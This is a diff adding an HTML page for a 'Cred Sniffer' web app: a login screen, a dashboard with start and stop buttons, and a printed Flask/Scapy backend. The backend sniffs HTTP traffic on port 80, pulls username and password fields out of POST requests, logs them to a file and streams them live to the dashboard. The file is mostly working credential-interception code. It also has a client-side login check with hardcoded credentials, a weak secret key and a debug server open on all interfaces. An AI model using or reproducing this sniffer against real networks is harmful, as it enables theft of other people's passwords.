@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTTP Cred Sniffer Application Code</title>
+    <!-- Bootstrap CSS for styling -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #212529; /* Dark background */
+            color: #f8f9fa; /* Light text */
+            font-family: 'Inter', sans-serif; /* Recommended font */
+        }
+        .navbar {
+            border-radius: 0.5rem; /* Rounded corners for navbar */
+            margin-bottom: 1.5rem;
+        }
+        .container {
+            max-width: 960px; /* Limit container width */
+        }
+        .card {
+            background-color: #343a40; /* Darker card background */
+            border: none;
+            border-radius: 0.75rem; /* More rounded corners for cards */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); /* Subtle shadow */
+        }
+        .form-control {
+            background-color: #495057;
+            color: #f8f9fa;
+            border: 1px solid #6c757d;
+            border-radius: 0.5rem;
+        }
+        .form-control:focus {
+            background-color: #495057;
+            color: #f8f9fa;
+            border-color: #80bdff;
+            box-shadow: 0 0 0 0.25rem rgba(13, 110, 253, 0.25);
+        }
+        .btn {
+            border-radius: 0.5rem; /* Rounded buttons */
+            padding: 0.75rem 1.25rem;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+        .btn-primary {
+            background-color: #0d6efd;
+            border-color: #0d6efd;
+        }
+        .btn-primary:hover {
+            background-color: #0b5ed7;
+            border-color: #0a58ca;
+        }
+        .btn-success {
+            background-color: #198754;
+            border-color: #198754;
+        }
+        .btn-success:hover {
+            background-color: #157347;
+            border-color: #146c43;
+        }
+        .btn-danger {
+            background-color: #dc3545;
+            border-color: #dc3545;
+        }
+        .btn-danger:hover {
+            background-color: #bb2d3b;
+            border-color: #bb2d3b;
+        }
+        #log {
+            background-color: #2c3034; /* Slightly different background for log */
+            border: 1px solid #495057;
+            padding: 1rem;
+            border-radius: 0.75rem;
+            height: 500px;
+            overflow-y: scroll;
+            white-space: pre-wrap; /* Preserve whitespace and wrap text */
+            font-family: 'Consolas', 'Monaco', monospace; /* Monospaced font for logs */
+            font-size: 0.875rem;
+        }
+        h2, h3, h5 {
+            color: #fff;
+        }
+        .code-section {
+            background-color: #1e1e1e;
+            padding: 1.5rem;
+            border-radius: 0.75rem;
+            margin-top: 2rem;
+            overflow-x: auto; /* Allow horizontal scrolling for code */
+        }
+        .code-section pre {
+            margin: 0;
+            color: #d4d4d4;
+        }
+        .code-section code {
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Login Page HTML Content (Normally rendered by Flask) -->
+    <div class="container mt-5" id="login-section">
+        <div class="row justify-content-center">
+            <div class="col-md-4">
+                <div class="card p-4">
+                    <h2 class="mb-4 text-center">Login</h2>
+                    <!-- Error message placeholder (Flask would populate this) -->
+                    <div id="login-error" class="alert alert-danger d-none"></div>
+                    <form id="login-form">
+                        <div class="mb-3">
+                            <label for="username" class="form-label">Username</label>
+                            <input type="text" id="username" name="username" class="form-control" required />
+                        </div>
+                        <div class="mb-3">
+                            <label for="password" class="form-label">Password</label>
+                            <input type="password" id="password" name="password" class="form-control" required />
+                        </div>
+                        <button type="submit" class="btn btn-primary w-100">Login</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Dashboard Page HTML Content (Normally rendered by Flask) -->
+    <div class="container mt-4 d-none" id="dashboard-section">
+        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">
+            <div class="container-fluid">
+                <a class="navbar-brand" href="#">Cred Sniffer Dashboard</a>
+                <button class="btn btn-danger" id="logout-btn">Logout</button>
+            </div>
+        </nav>
+        <h3>Status: <span id="status">Idle</span></h3>
+        <button class="btn btn-success me-2" id="start-sniffer-btn">Start Sniffer</button>
+        <button class="btn btn-danger" id="stop-sniffer-btn">Stop Sniffer</button>
+
+        <div class="mt-4 p-3 bg-secondary rounded" id="log">
+            <h5>Logs:</h5>
+        </div>
+    </div>
+
+    <!-- Socket.IO Library -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.min.js"></script>
+
+    <script>
+        // --- Frontend JavaScript Logic ---
+        // This JavaScript would normally be in dashboard.html and handle client-side interactions.
+
+        // Simulate login (since there's no backend in this single HTML file)
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Simple client-side "authentication" for demonstration
+            if (username === 'admin' && password === 'pass123') {
+                document.getElementById('login-section').classList.add('d-none');
+                document.getElementById('dashboard-section').classList.remove('d-none');
+                // In a real app, this would be a redirect from the server
+            } else {
+                const errorDiv = document.getElementById('login-error');
+                errorDiv.innerText = 'Invalid credentials';
+                errorDiv.classList.remove('d-none');
+            }
+        });
+
+        document.getElementById('logout-btn').addEventListener('click', function() {
+            document.getElementById('dashboard-section').classList.add('d-none');
+            document.getElementById('login-section').classList.remove('d-none');
+            document.getElementById('login-error').classList.add('d-none'); // Clear any previous error
+            document.getElementById('login-form').reset(); // Clear form
+            // In a real app, this would be a redirect from the server
+        });
+
+
+        // Socket.IO client-side code (requires a running Flask-SocketIO backend)
+        // This part will only connect if you run the Python app.py on a server.
+        var socket = io();
+
+        socket.on('new_creds', function(msg) {
+            let log = document.getElementById('log');
+            log.innerText += "\n" + msg.data;
+            log.scrollTop = log.scrollHeight; // Auto-scroll to bottom
+        });
+
+        socket.on('status', function(msg) {
+            document.getElementById('status').innerText = msg.data;
+        });
+
+        document.getElementById('start-sniffer-btn').addEventListener('click', function() {
+            socket.emit('start_sniffer');
+        });
+
+        document.getElementById('stop-sniffer-btn').addEventListener('click', function() {
+            socket.emit('stop_sniffer');
+        });
+
+    </script>
+
+    <!-- Python Backend Code (app.py) - This is for viewing only, it does NOT run in the browser -->
+    <div class="container mt-5 code-section">
+        <h3>Python Backend Code (`app.py`)</h3>
+        <p class="text-warning">
+            <strong>IMPORTANT:</strong> This Python code runs on a server and cannot be executed directly within this HTML file in your browser.
+            You need to run `app.py` separately on a Python server (e.g., with Flask's development server or Gunicorn)
+            for the application to function.
+        </p>
+        <pre><code>
+from flask import Flask, render_template, request, redirect, url_for, session
+from flask_socketio import SocketIO, emit
+import threading
+from scapy.all import sniff, TCP, Raw
+import re
+import os
+
+app = Flask(__name__)
+# IMPORTANT: Change this secret key for production and use an environment variable!
+app.secret_key = '2005'
+socketio = SocketIO(app)
+
+LOG_FILE = "creds_log.txt"
+
+# Simple credentials (demo purposes only)
+USERNAME = "admin"
+PASSWORD = "pass123"
+
+running = False
+
+def log_creds(data):
+    """Logs captured credentials to a file."""
+    with open(LOG_FILE, "a") as f:
+        f.write(data + "\n")
+
+def process_packet(pkt):
+    """
+    Processes a captured packet to check for HTTP POST requests
+    containing potential credentials.
+    """
+    # Check if the packet has a Raw layer (contains payload) and a TCP layer
+    if pkt.haslayer(Raw) and pkt.haslayer(TCP):
+        try:
+            # Decode the raw payload, ignoring errors for non-text data
+            payload = pkt[Raw].load.decode(errors="ignore")
+            # Check for POST method and common credential keywords
+            if "POST" in payload and ("user" in payload or "pass" in payload):
+                src = pkt[0][1].src # Source IP address
+                dst = pkt[0][1].dst # Destination IP address
+                # Use regex to find key=value pairs that might be credentials
+                creds = re.findall(r"(\w+)=([\w@\.%\-]+)", payload)
+                text = f"\n[!] Possible HTTP Credentials!\nFrom: {src} -> {dst}\n"
+                for k, v in creds:
+                    text += f"  {k}: {v}\n"
+                text += "-"*50
+                print(text) # Print to server console
+                log_creds(text) # Log to file
+                # Emit the new credentials to connected clients via SocketIO
+                socketio.emit('new_creds', {'data': text})
+        except Exception as e:
+            # Handle potential decoding or processing errors
+            print(f"Error processing packet: {e}")
+
+def sniff_packets():
+    """
+    Starts the packet sniffing process.
+    NOTE: This requires elevated privileges (e.g., running as root/admin)
+          and will likely NOT work on cloud hosting platforms like Render/Heroku
+          due to security restrictions on raw socket access.
+    """
+    print("Starting packet sniffer...")
+    # Sniff TCP packets on port 80 (HTTP)
+    # prn calls process_packet for each packet
+    # store=False means packets are not stored in memory (more efficient)
+    sniff(filter="tcp port 80", prn=process_packet, store=False, stop_filter=lambda x: not running)
+    print("Packet sniffer stopped.")
+
+# --- Flask Routes ---
+
+@app.route('/')
+def index():
+    """Renders the login page or redirects to dashboard if already logged in."""
+    if 'logged_in' in session:
+        return redirect(url_for('dashboard'))
+    return render_template('login.html')
+
+@app.route('/login', methods=['POST'])
+def login():
+    """Handles user login authentication."""
+    username = request.form['username']
+    password = request.form['password']
+    if username == USERNAME and password == PASSWORD:
+        session['logged_in'] = True
+        return redirect(url_for('dashboard'))
+    else:
+        # Pass error message to the login template
+        return render_template('login.html', error="Invalid credentials")
+
+@app.route('/dashboard')
+def dashboard():
+    """Renders the dashboard page, requires login."""
+    if 'logged_in' not in session:
+        return redirect(url_for('index'))
+    return render_template('dashboard.html')
+
+@app.route('/logout')
+def logout():
+    """Logs out the user by clearing the session."""
+    session.clear()
+    return redirect(url_for('index'))
+
+# --- Flask-SocketIO Event Handlers ---
+
+@socketio.on('start_sniffer')
+def start_sniffer_event():
+    """Handles 'start_sniffer' event from client to begin sniffing."""
+    global running
+    if not running:
+        running = True
+        # Start sniffing in a separate thread to avoid blocking the Flask app
+        t = threading.Thread(target=sniff_packets)
+        t.daemon = True # Daemon thread exits when main program exits
+        t.start()
+        emit('status', {'data': 'Sniffer Started'})
+        print("Sniffer start request received.")
+    else:
+        emit('status', {'data': 'Sniffer already running.'})
+
+@socketio.on('stop_sniffer')
+def stop_sniffer_event():
+    """Handles 'stop_sniffer' event from client to stop sniffing."""
+    global running
+    if running:
+        running = False
+        emit('status', {'data': 'Sniffer Stopped'})
+        print("Sniffer stop request received.")
+    else:
+        emit('status', {'data': 'Sniffer not running.'})
+
+# --- Main entry point for running the Flask-SocketIO app ---
+if __name__ == '__main__':
+    # This block runs the development server when app.py is executed directly.
+    # For production, use a WSGI server like Gunicorn (e.g., gunicorn --worker-class geventwebsocket.gunicorn.workers.GeventWebSocketWorker -w 1 app:app)
+    print("Starting Flask-SocketIO development server...")
+    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
+
+```</pre>
+    </div>
+
+</body>
+</html>
